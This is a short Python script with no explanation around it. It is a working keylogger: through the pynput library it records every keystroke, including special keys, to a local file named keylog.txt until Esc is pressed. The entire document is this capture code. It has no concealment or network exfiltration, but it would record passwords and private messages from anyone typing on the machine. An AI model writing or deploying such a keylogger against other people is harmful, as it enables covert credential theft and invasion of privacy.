from pynput import keyboard

log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("[ENTER]\n")
            elif key == keyboard.Key.backspace:
                f.write("[BACKSPACE]")
            elif key == keyboard.Key.tab:
                f.write("[TAB]")
            else:
                f.write(f"[{key.name}]")

def on_release(key):
    if key == keyboard.Key.esc:
        return False


with keyboard.Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()
                
